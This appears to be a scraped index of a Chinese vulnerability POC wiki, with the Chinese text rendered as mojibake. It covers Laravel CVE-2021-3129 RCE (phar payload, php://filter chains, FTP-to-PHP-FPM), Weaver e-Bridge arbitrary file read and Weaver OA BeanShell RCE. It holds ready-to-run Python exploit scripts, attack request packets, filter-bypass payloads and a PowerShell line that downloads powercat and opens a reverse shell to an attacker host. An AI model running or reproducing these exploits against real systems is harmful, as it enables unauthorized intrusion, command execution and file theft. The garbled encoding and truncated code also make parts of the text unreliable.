file_get_contents('php://filter/read=convert.iconv.utf16le.utf-8|convert.base64-decode/resource=/tmp/test.txt'); TEST! è¯´åˆ°å¯¹é½ï¼Œå¦‚æœæ—¥å¿—æ–‡ä»¶æœ¬èº«ä¸æ˜¯2å­—èŠ‚å¯¹é½çš„ï¼Œè½¬æ¢è¿‡æ»¤å™¨å°†å¦‚ä½•å¤„ç†ï¼Ÿ PHP Warning: file_get_contents(): iconv stream filter(\"utf16le\"=>\"utf-8\"): invalid multibyte sequence in phpshell code on line 1 è¿™åˆæ˜¯ä¸€ä¸ªé—®é¢˜ã€‚ä¸è¿‡ï¼Œæˆ‘ä»¬å¯ä»¥å€ŸåŠ©ä¸¤ä¸ªpayloadæ¥è½»æ¾åœ°è§£å†³è¿™ä¸ªé—®é¢˜ï¼šä¸€ä¸ªæ˜¯æ— å®³çš„payload Aï¼Œå¦ä¸€ä¸ªæ˜¯å…·æœ‰æ”»å‡»æ€§çš„payload Bï¼Œå…·ä½“å¦‚ä¸‹æ‰€ç¤ºï¼š [prefix]PAYLOAD_A[midfix]PAYLOAD_A[suffix] [prefix]PAYLOAD_B[midfix]PAYLOAD_B[suffix] ç”±äºè¿™é‡Œå‰ç¼€ã€ä¸­ç¼€å’Œåç¼€éƒ½å­˜åœ¨ä¸¤ä»½ï¼Œè¿˜æä¾›äº†payload_aå’Œpayload_bï¼Œæ‰€ä»¥ï¼Œæ—¥å¿—æ–‡ä»¶çš„å¤§å°å¿…ç„¶æ˜¯å¶æ•°ï¼Œä»è€Œé¿å…äº†é”™è¯¯çš„å‘ç”Ÿã€‚ æœ€åï¼Œæˆ‘ä»¬è¿˜è¦è§£å†³æœ€åä¸€ä¸ªé—®é¢˜ï¼šæˆ‘ä»¬ä½¿ç”¨NULLå­—èŠ‚å°†payloadçš„å­—èŠ‚ä»ä¸€ä¸ªå¡«å……ä¸ºä¸¤ä¸ªã€‚åœ¨PHPä¸­è¯•å›¾åŠ è½½ä¸€ä¸ªå¸¦æœ‰NULLå­—èŠ‚çš„æ–‡ä»¶æ—¶ï¼Œä¼šç”Ÿæˆä»¥ä¸‹é”™è¯¯ï¼š PHP Warning: file_get_contents() expects parameter 1 to be a valid path, string givenin php shell code on line 1 å› æ­¤ï¼Œæˆ‘ä»¬å°†æ— æ³•åœ¨é”™è¯¯æ—¥å¿—ä¸­æ³¨å…¥å¸¦æœ‰NULLå­—èŠ‚çš„payloadã€‚å¹¸è¿çš„æ˜¯ï¼Œæœ€åä¸€ä¸ªè¿‡æ»¤å™¨å¯ä»¥å¸®åˆ°æˆ‘ä»¬ï¼Œå®ƒå°±æ˜¯convert.quoted-printable-decodeã€‚ æˆ‘ä»¬å¯ä»¥ä½¿ç”¨=00å¯¹NULLå­—èŠ‚è¿›è¡Œç¼–ç ã€‚ ä¸‹é¢æ˜¯æˆ‘ä»¬æœ€ç»ˆçš„è½¬æ¢é“¾ï¼š viewFile:php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.ba se64-decode/resource=/path/to/storage/logs/laravel.log åˆ›å»ºä¸€ä¸ªPHPGGC payloadï¼Œå¹¶å¯¹å…¶è¿›è¡Œç¼–ç ï¼š php -d'phar.readonly=0' ./phpggc monolog/rce1 system id --phar phar -o php://output | base64 -w0 | sed -E 's/./\\0=00/g' U=00E=00s=00D=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00I=00Q=00A=00M=00f=00n=00/=00Y=00B=00A=00A=00A=00A=00A=00Q=00A=00A=00A=00A=00F=00A=00B=00I=00A=00Z=00H=00V=00t=00b=00X=00l=00u=00d=00Q=004=00A=001=00U=00l=003=00t=00r=00Q=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00B=000=00Z=00X=00N=000=00U=00E=00s=00D=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00I=00Q=00A=007=00m=00z=00i=004=00H=00Q=00A=00A=00A=00B=000=00A=00A=00A=00A=00O=00A=00B=00I=00A=00L=00n=00B=00o=00Y=00X=00I=00v=00c=003=00R=001=00Y=00i=005=00w=00a=00H=00B=00u=00d=00Q=004=00A=00V=00y=00t=00B=00h=00L=00Y=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=008=00P=003=00B=00o=00c=00C=00B=00f=00X=000=00h=00B=00T=00F=00R=00f=00Q=000=009=00N=00U=00E=00l=00M=00R=00V=00I=00o=00K=00T=00s=00g=00P=00z=004=00N=00C=00l=00B=00L=00A=00w=00Q=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00C=00E=00A=00D=00H=005=00/=002=00A=00Q=00A=00A=00A=00A...=00Q=00==00==00 æ¸…ç©ºæ—¥å¿— viewFile: php://filter/write=convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=/path/to/storage/logs/laravel.log åˆ›å»ºç¬¬ä¸€ä¸ªæ—¥å¿—æ¡ç›®ï¼Œç”¨äºå¯¹é½ï¼š viewFile: AA åˆ›å»ºå¸¦æœ‰payloadæ—¥å¿—æ¡ç›®ï¼š viewFile: U=00E=00s=00D=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00I=00Q=00A=00M=00f=00n=00/=00Y=00B=00A=00A=00A=00A=00A=00Q=00A=00A=00A=00A=00F=00A=00B=00I=00A=00Z=00H=00V=00t=00b=00X=00l=00u=00d=00Q=004=00A=001=00U=00l=003=00t=00r=00Q=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00B=000=00Z=00X=00N=000=00U=00E=00s=00D=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00I=00Q=00A=007=00m=00z=00i=004=00H=00Q=00A=00A=00A=00B=000=00A=00A=00A=00A=00O=00A=00B=00I=00A=00L=00n=00B=00o=00Y=00X=00I=00v=00c=003=00R=001=00Y=00i=005=00w=00a=00H=00B=00u=00d=00Q=004=00A=00V=00y=00t=00B=00h=00L=00Y=00B=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=008=00P=003=00B=00o=00c=00C=00B=00f=00X=000=00h=00B=00T=00F=00R=00f=00Q=000=009=00N=00U=00E=00l=00M=00R=00V=00I=00o=00K=00T=00s=00g=00P=00z=004=00N=00C=00l=00B=00L=00A=00w=00Q=00A=00A=00A=00A=00A=00A=00A=00A=00A=00A=00C=00E=00A=00D=00H=005=00/=002=00A=00Q=00A=00A=00A=00A...=00Q=00==00==00 é€šè¿‡æˆ‘ä»¬çš„è¿‡æ»¤å™¨å°†æ—¥å¿—æ–‡ä»¶è½¬æ¢ä¸ºæœ‰æ•ˆçš„PHARï¼š viewFile: php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=/path/to/storage/logs/laravel.log å¯åŠ¨PHARçš„ååºåˆ—åŒ–è¿‡ç¨‹ï¼š viewFile: phar:///path/to/storage/logs/laravel.log åˆ©ç”¨FTPä¸PHP-FPMè¿›è¡Œäº¤äº’ ç”±äºæˆ‘ä»¬å¯ä»¥è¿è¡Œfile_get_contentsæ¥æŸ¥æ‰¾ä»»ä½•ä¸œè¥¿ï¼Œå› æ­¤ï¼Œå¯ä»¥é€šè¿‡å‘é€HTTPè¯·æ±‚æ¥æ‰«æå¸¸ç”¨ç«¯å£ã€‚ç»“æœå‘ç°ï¼ŒPHP-FPMä¼¼ä¹æ­£åœ¨ä¾¦å¬ç«¯å£9000ã€‚ ä¼—æ‰€å‘¨çŸ¥ï¼Œå¦‚æœæˆ‘ä»¬èƒ½å‘PHP-FPMæœåŠ¡å‘é€ä¸€ä¸ªä»»æ„çš„äºŒè¿›åˆ¶æ•°æ®åŒ…ï¼Œå°±å¯ä»¥åœ¨æœºå™¨ä¸Šæ‰§è¡Œä»£ç ã€‚è¿™ç§æŠ€æœ¯ç»å¸¸ä¸gopher://åè®®ç»“åˆä½¿ç”¨ï¼Œcurlæ”¯æŒgopher://åè®®ï¼Œä½†PHPå´ä¸æ”¯æŒã€‚ å¦ä¸€ä¸ªå·²çŸ¥çš„å…è®¸é€šè¿‡TCPå‘é€äºŒè¿›åˆ¶æ•°æ®åŒ…çš„åè®®æ˜¯FTPï¼Œæ›´å‡†ç¡®çš„è¯´æ˜¯è¯¥åè®®çš„è¢«åŠ¨æ¨¡å¼ï¼šå¦‚æœä¸€ä¸ªå®¢æˆ·ç«¯è¯•å›¾ä»FTPæœåŠ¡å™¨ä¸Šè¯»å–ä¸€ä¸ªæ–‡ä»¶ï¼ˆæˆ–å†™å…¥ï¼‰ï¼ŒæœåŠ¡å™¨ä¼šé€šçŸ¥å®¢æˆ·ç«¯å°†æ–‡ä»¶çš„å†…å®¹è¯»å–ï¼ˆæˆ–å†™ï¼‰åˆ°ä¸€ä¸ªç‰¹å®šçš„IPå’Œç«¯å£ä¸Šã€‚è€Œä¸”ï¼Œè¿™é‡Œå¯¹è¿™äº›IPå’Œç«¯å£æ²¡æœ‰è¿›è¡Œå¿…è¦çš„é™åˆ¶ã€‚ä¾‹å¦‚ï¼ŒæœåŠ¡å™¨å¯ä»¥å‘Šè¯‰å®¢æˆ·ç«¯è¿æ¥åˆ°è‡ªå·±çš„ä¸€ä¸ªç«¯å£ï¼Œå¦‚æœå®ƒæ„¿æ„çš„è¯ã€‚ ç°åœ¨ï¼Œå¦‚æœæˆ‘ä»¬å°è¯•ä½¿ç”¨viewFile=ftp://evil-server.lexfo.fr/file.txtæ¥åˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼Œä¼šå‘ç”Ÿä»¥ä¸‹æƒ…å†µï¼š file_get_contents()è¿æ¥åˆ°æˆ‘ä»¬çš„FTPæœåŠ¡å™¨ï¼Œå¹¶ä¸‹è½½file.txtã€‚ file_put_contents()è¿æ¥åˆ°æˆ‘ä»¬çš„FTPæœåŠ¡å™¨ï¼Œå¹¶å°†å…¶ä¸Šä¼ å›file.txtã€‚ æ‚¨å¯èƒ½å·²ç»çŸ¥é“è¿™æ˜¯æ€ä¹ˆå›äº‹ï¼šæˆ‘ä»¬å°†ä½¿ç”¨FTPåè®®çš„è¢«åŠ¨æ¨¡å¼è®©file_get_contents()åœ¨æˆ‘ä»¬çš„æœåŠ¡å™¨ä¸Šä¸‹è½½ä¸€ä¸ªæ–‡ä»¶ï¼Œå½“å®ƒè¯•å›¾ä½¿ç”¨file_put_contents()æŠŠå®ƒä¸Šä¼ å›å»æ—¶ï¼Œæˆ‘ä»¬å°†å‘Šè¯‰å®ƒæŠŠæ–‡ä»¶å‘é€åˆ°127.0.0.1:9000ã€‚ è¿™æ ·ï¼Œæˆ‘ä»¬å°±å¯ä»¥å‘PHP-FPMå‘é€ä¸€ä¸ªä»»æ„çš„æ•°æ®åŒ…ï¼Œä»è€Œæ‰§è¡Œä»£ç ã€‚ åˆ©ç”¨è¿™ç§æ–¹æ³•ï¼Œåœ¨æˆ‘ä»¬çš„ç›®æ ‡ä¸ŠæˆåŠŸåœ°åˆ©ç”¨äº†è¯¥æ¼æ´ã€‚ æ¼æ´åˆ©ç”¨POC # Exploit Title: Laravel 8.4.2 debug mode - Remote code execution # Date: 1.14.2021 # Exploit Author: SunCSR Team # Vendor Homepage: https://laravel.com/ # References: # https://www.ambionics.io/blog/laravel-debug-rce # https://viblo.asia/p/6J3ZgN8PKmB # Version: payload.txt'''%(command)) payload = '' with open('payload.txt', 'r') as fp: payload = fp.read() payload = payload.replace('==', '=3D=') for i in range(padding): payload += '=00' os.system('rm -rf payload.txt') return payload def main(): if len(sys.argv) å‚è€ƒæ–‡ç«  ç±³æ–¯ç‰¹å›¢é˜Ÿ|æ¼æ´åˆ†æ | Laravel Debugé¡µé¢RCEï¼ˆCVE-2021-3129ï¼‰åˆ†æå¤ç° é™Œé™Œå®‰å…¨|FTPåˆ©ç”¨|LARAVELçš„é‚£ä¸ªRCEæœ€æœ‰è¶£çš„ç‚¹åœ¨è¿™é‡Œ åŸä½œè€…æ¼æ´åˆ†æ WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/å¼€å‘è¯­è¨€æ¼æ´/":{"url":"PeiQi_Wiki/å¼€å‘è¯­è¨€æ¼æ´/","title":"å¼€å‘è¯­è¨€æ¼æ´","keywords":"","body":"å¼€å‘è¯­è¨€æ¼æ´ğŸ­ WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/","title":"OAäº§å“æ¼æ´","keywords":"","body":"OAäº§å“æ¼æ´ğŸ¶ WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/æ³›å¾®OA/":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/æ³›å¾®OA/","title":"æ³›å¾®OA","keywords":"","body":"æ³›å¾®OA æ³›å¾®äº‘æ¡¥ e-Bridge ä»»æ„æ–‡ä»¶è¯»å– æ³›å¾®OA Bsh è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CNVD-2019-32204 æ³›å¾®OA e-cology æ•°æ®åº“é…ç½®ä¿¡æ¯æ³„æ¼æ¼æ´ æ³›å¾®OA WorkflowCenterTreeDataæ¥å£SQLæ³¨å…¥(ä»…é™oracleæ•°æ®åº“) CNVD-2019-34241 æ³›å¾®OA sysinterface/codeEdit.jsp é¡µé¢ä»»æ„æ–‡ä»¶ä¸Šä¼  WooYun-2015-0155705 WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/æ³›å¾®OA/æ³›å¾®äº‘æ¡¥ e-Bridge ä»»æ„æ–‡ä»¶è¯»å–.html":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/æ³›å¾®OA/æ³›å¾®äº‘æ¡¥ e-Bridge ä»»æ„æ–‡ä»¶è¯»å–.html","title":"æ³›å¾®äº‘æ¡¥ e-Bridge ä»»æ„æ–‡ä»¶è¯»å–","keywords":"","body":"æ³›å¾®äº‘æ¡¥ e-Bridge ä»»æ„æ–‡ä»¶è¯»å– æ¼æ´æè¿° æ³›å¾®äº‘æ¡¥ï¼ˆe-Bridgeï¼‰æ˜¯ä¸Šæµ·æ³›å¾®å…¬å¸åœ¨â€äº’è”ç½‘+â€çš„èƒŒæ™¯ä¸‹ç ”å‘çš„ä¸€æ¬¾ç”¨äºæ¡¥æ¥äº’è”ç½‘å¼€æ”¾èµ„æºä¸ä¼ä¸šä¿¡æ¯åŒ–ç³»ç»Ÿçš„ç³»ç»Ÿé›†æˆä¸­é—´ä»¶ã€‚æ³›å¾®äº‘æ¡¥å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼Œæ”»å‡»è€…æˆåŠŸåˆ©ç”¨è¯¥æ¼æ´ï¼Œå¯å®ç°ä»»æ„æ–‡ä»¶è¯»å–ï¼Œè·å–æ•æ„Ÿä¿¡æ¯ã€‚ å½±å“ç‰ˆæœ¬ [!NOTE] æ³›å¾®äº‘æ¡¥ e-Bridge 2018-2019 å¤šä¸ªç‰ˆæœ¬ FOFA [!NOTE] title=\"æ³›å¾®äº‘æ¡¥e-Bridge\" æ¼æ´å¤ç° [!NOTE] åˆ†ä¸ºä¸¤ç§ï¼Œåˆ†åˆ«ä¸º Windows å’Œ Linux Windows è®¿é—® http://xxx.xxx.xxx.xxx/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C:/&fileExt=txt æˆåŠŸè¿”å› idå€¼,è¯´æ˜å«æœ‰æ­¤æ¼æ´ è°ƒç”¨æŸ¥çœ‹æ–‡ä»¶æ¥å£è®¿é—® http://xxx.xxx.xxx.xxx/file/fileNoLogin/idå€¼ Linux è®¿é—® http://xxx.xxx.xxx.xxx/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt æˆåŠŸè¿”å› idå€¼,è¯´æ˜å«æœ‰æ­¤æ¼æ´ è°ƒç”¨æŸ¥çœ‹æ–‡ä»¶æ¥å£è®¿é—® http://xxx.xxx.xxx.xxx/file/fileNoLogin/idå€¼ æ¼æ´åˆ©ç”¨POC [!NOTE] æ³¨æ„è¯»å–Linuxç³»ç»Ÿæ–‡ä»¶æ—¶ï¼Œéœ€è¦å®Œæ•´è·¯å¾„ ä¾‹å¦‚è¯»å–æ ¹ç›®å½•ä¸‹çš„ 1.txt åº”ä¸º /1.txt è€Œä¸æ˜¯ 1.txt #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import base64 import requests import random import re import json import sys def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: æ³›å¾®äº‘æ¡¥ e-Bridge \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') # åˆ¤æ–­æ“ä½œç³»ç»Ÿ or åˆ¤æ–­æ¼æ´æ˜¯å¦å¯åˆ©ç”¨ def POC_1(target_url): vuln_url_1 = target_url + \"/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C:/&fileExt=txt\" vuln_url_2 = target_url + \"/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt\" vuln_url_3 = target_url + \"/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///&fileExt=txt\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } try: response_1 = requests.get(url=vuln_url_1, headers=headers, verify=False, timeout=10) response_2 = requests.get(url=vuln_url_2, headers=headers, verify=False, timeout=10) response_3 = requests.get(url=vuln_url_3, headers=headers, verify=False, timeout=10) if \"æ— æ³•éªŒè¯æ‚¨çš„èº«ä»½\" in response_1.text and \"æ— æ³•éªŒè¯æ‚¨çš„èº«ä»½\" in response_2.text: print(\"\\033[31m[x] æ¼æ´å·²ä¿®å¤ï¼Œä¸å­˜åœ¨æ¼æ´ \\033[0m\") sys.exit(0) else: if \"No such file or directory\" in response_1.text: print(\"\\033[32m[o] ç›®æ ‡ä¸º Linux ç³»ç»Ÿ\\033[0m\") id = re.findall(r'\"id\":\"(.*?)\"', response_3.text)[0] print(\"\\033[32m[o] æˆåŠŸè·å–idï¼š{}\\033[0m\".format(id)) return id,\"linux\" elif \"ç³»ç»Ÿæ‰¾ä¸åˆ°æŒ‡å®šçš„è·¯å¾„\" in response_2.text: print(\"\\033[32m[o] ç›®æ ‡ä¸º Windows ç³»ç»Ÿ\\033[0m\") id = re.findall(r'\"id\":\"(.*?)\"', response_1.text)[0] print(\"\\033[32m[o] æˆåŠŸè·å–idï¼š{}\\033[0m\".format(id)) return id,\"windows\" else: print(\"\\033[31m[x] æ— æ³•è·å–ç›®æ ‡ç³»ç»Ÿ\\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥:{} \\033[0m\".format(e)) sys.exit(0) # éªŒè¯æ¼æ´ def POC_2(target_url, id): file_url = target_url + \"/file/fileNoLogin/{}\".format(id) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } try: response = requests.get(url=file_url, headers=headers, verify=False, timeout=10) response.encoding = 'GBK' print(\"\\033[32m[o] æˆåŠŸè¯»å–ï¼š\\n\\033[0m{}\".format(response.text)) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥:{} \\033[0m\".format(e)) sys.exit(0) # windows æ–‡ä»¶è¯»å– def POC_3(target_url, File): file_url = target_url + \"/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C:/{}&fileExt=txt\".format(File) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } try: response = requests.get(url=file_url, headers=headers, verify=False, timeout=10) id = re.findall(r'\"id\":\"(.*?)\"', response.text)[0] print(\"\\033[32m[o] æˆåŠŸè·å–idï¼š{}\\033[0m\".format(id)) POC_2(target_url, id) except : print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ï¼Œæ— æ³•è¯»å–æ–‡ä»¶ \\033[0m)\") # linuxè¯»å–æ–‡ä»¶ def POC_4(target_url, File): file_url = target_url + \"/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file://{}&fileExt=txt\".format(File) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } try: response = requests.get(url=file_url, headers=headers, verify=False, timeout=10) id = re.findall(r'\"id\":\"(.*?)\"', response.text)[0] print(\"\\033[32m[o] æˆåŠŸè·å–idï¼š{}\\033[0m\".format(id)) POC_2(target_url, id) except: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ï¼Œæ— æ³•è¯»å–æ–‡ä»¶ \\033[0m)\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) id,system = POC_1(target_url) POC_2(target_url, id) while True: if system == \"windows\": File = input(\"\\033[35mFile >>> \\033[0m\") if File == \"exit\": sys.exit(0) else: POC_3(target_url, File) if system == \"linux\": File = input(\"\\033[35mFile >>> \\033[0m\") if File == \"exit\": sys.exit(0) else: POC_4(target_url, File) WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/æ³›å¾®OA/æ³›å¾®OA Bsh è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CNVD-2019-32204.html":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/æ³›å¾®OA/æ³›å¾®OA Bsh è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CNVD-2019-32204.html","title":"æ³›å¾®OA Bsh è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CNVD-2019-32204","keywords":"","body":"æ³›å¾®OA Bsh è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CNVD-2019-32204 æ¼æ´æè¿° 2019å¹´9æœˆ17æ—¥æ³›å¾®OAå®˜æ–¹æ›´æ–°äº†ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´è¡¥ä¸, æ³›å¾®e-cology OAç³»ç»Ÿçš„Java Beanshellæ¥å£å¯è¢«æœªæˆæƒè®¿é—®, æ”»å‡»è€…è°ƒç”¨è¯¥Beanshellæ¥å£, å¯æ„é€ ç‰¹å®šçš„HTTPè¯·æ±‚ç»•è¿‡æ³›å¾®æœ¬èº«ä¸€äº›å®‰å…¨é™åˆ¶ä»è€Œè¾¾æˆè¿œç¨‹å‘½ä»¤æ‰§è¡Œ, æ¼æ´ç­‰çº§ä¸¥é‡. FOFA [!NOTE] app=â€œæ³›å¾®-ååŒåŠå…¬OAâ€ å½±å“ç‰ˆæœ¬ [!NOTE] E-cology 7.0 E-cology 8.0 E-cology 8.1 E-cology 9.0 æ¼æ´å¤ç° ç›´æ¥åœ¨ç½‘ç«™æ ¹ç›®å½•ååŠ å…¥ç»„ä»¶è®¿é—®è·¯å¾„ /weaver/bsh.servlet.BshServlet/ï¼Œå¦‚ä¸‹å›¾åœ¨victimä¸Šæ‰§è¡Œäº†å‘½ä»¤â€œipconfig.exeâ€ è¯·æ±‚åŒ…ä¸º POST /weaver/bsh.servlet.BshServlet HTTP/1.1 Host: xxxxxxxx:8088 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Length: 98 Content-Type: application/x-www-form-urlencoded bsh.script=eval%00(\"ex\"%2b\"ec(\\\"whoami\\\")\");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw å…³äºç»•è¿‡ eval%00(\"ex\"%2b\"ec(\\\"whoami\\\")\"); ex\\u0065c(\"cmd /c dir\"); IEX(New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c ip -p 6666 -e cmd æ¼æ´POC https://github.com/myzing00/Vulnerability-analysis/tree/master/0917/weaver-oa/CNVD-2019-32204 #/usr/bin/python #coding:utf-8 #Author:Ja0k #For Weaver-Ecology-OA_RCE import urllib3 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) import requests,sys headers = { 'Content-Type': 'text/xml; charset=utf-8', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0', 'Cache-Control': 'max-age=0', 'Content-Type': 'application/x-www-form-urlencoded', 'Upgrade-Insecure-Requests': '1', 'Content-Length': '578' } proxies= {'http':'http://127.0.0.1:8080'} def Poc_check(target): Url_Payload1=\"/bsh.servlet.BshServlet\" Url_Payload2=\"/weaver/bsh.servlet.BshServlet\" Url_Payload3=\"/weaveroa/bsh.servlet.BshServlet\" Url_Payload4=\"/oa/bsh.servlet.BshServlet\" Data_Payload1=\"\"\"bsh.script=exec(\"whoami\");&bsh.servlet.output=raw\"\"\" Data_Payload2= \"\"\"bsh.script=\\u0065\\u0078\\u0065\\u0063(\"whoami\");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw\"\"\" Data_Payload3= \"\"\"bsh.script=eval%00(\"ex\"%2b\"ec(bsh.httpServletRequest.getParameter(\\\\\"command\\\\\"))\");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw&command=whoami\"\"\" for Url_Payload in (Url_Payload1,Url_Payload2,Url_Payload3,Url_Payload4): url= target + Url_Payload for Data_payload in (Data_Payload1,Data_Payload2,Data_Payload3): try: http_response = requests.post(url,data=Data_payload,headers=headers,verify=False) #print http_response.status_code if http_response.status_code == 200: if \";\" not in (http_response.content): if \"Login.jsp\" not in (http_response.content): if \"Error\" not in (http_response.content): print \"{0} is a E-cologyOA_RCE Vulnerability\".format(url) print \"Server Current Usernameï¼š{0}\".format(http_response.content) elif http_response.status_code == 500: print \"{0}500 maybe is Weaver-EcologyOAï¼ŒPlease confirm by yourself \".format(url) else: pass except Exception,Error: pass if __name__ == '__main__': for line in open(sys.argv[1]).readlines(): target=line.strip() Poc_check(target) #1.install python Dependencies Library pip install requests #2.æ‰¹é‡è„šæœ¬ æ‰§è¡Œ python Weaver-Ecology-OA_RCE-exp.py url.txtæ–‡ä»¶ä¸­ æ˜¯urlåœ°å€ éœ€è¦å¸¦httpåè®® æœ‰ä»»ä½•é—®é¢˜è¯·issue WgpSec POCæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-01-22 09:08:20 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/æ³›å¾®OA/æ³›å¾®OA WorkflowCenterTreeDataæ¥å£SQLæ³¨å…¥.html":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/æ³›å¾®OA/æ³›å¾®OA WorkflowCenterTreeDataæ¥å£SQLæ³¨å…¥.html","title":"æ³›å¾®OA WorkflowCenterTreeDataæ¥å£SQLæ³¨å…¥(ä»…é™oracleæ•°æ®åº“)","keywords":"","body":"æ³›å¾®OA WorkflowCenterTreeDataæ¥å£SQLæ³¨å…¥(ä»…é™oracleæ•°æ®åº“) CNVD-2019-34241 æ¼æ´æè¿° 2019å¹´10æœˆ10æ—¥CNVDå‘å¸ƒäº†æ³›å¾®e-cology OAç³»ç»Ÿå­˜åœ¨SQLæ³¨å…¥æ¼æ´ã€‚è¯¥æ¼æ´æ˜¯ç”±äºOAç³»ç»Ÿçš„WorkflowCenterTreeDataæ¥å£ä¸­æ¶‰åŠOracleæ•°æ®åº“çš„SQLè¯­å¥ç¼ºä¹å®‰å…¨æ£€æŸ¥æªæ–½æ‰€å¯¼è‡´çš„ï¼Œä»»æ„æ”»å‡»è€…éƒ½å¯å€ŸSQLè¯­å¥æ‹¼æ¥æ—¶æœºæ³¨å…¥æ¶æ„payloadï¼Œé€ æˆSQLæ³¨å…¥æ”»å‡»ã€‚ å½±å“ç‰ˆæœ¬ [!NOTE] ä½¿ç”¨Oracleæ•°æ®åº“çš„æ³›å¾®æœåŠ¡ æ¼æ´å¤ç° æ³›å‹å¾®ç”Ÿæ€OAç³»ç»Ÿçš„WorkflowCenterTreeDataæ¥å£åœ¨ä½¿ç”¨Oracleæ•°æ®åº“æ—¶ï¼Œç”±äºå†…ç½®sqlè¯­å¥åˆ†è§£ä¸ä¸¥å¯†ï¼Œå¯¼è‡´å…¶å­˜åœ¨çš„sqlæ³¨å…¥æ¼æ´ æ¼æ´è¯·æ±‚åŒ… POST 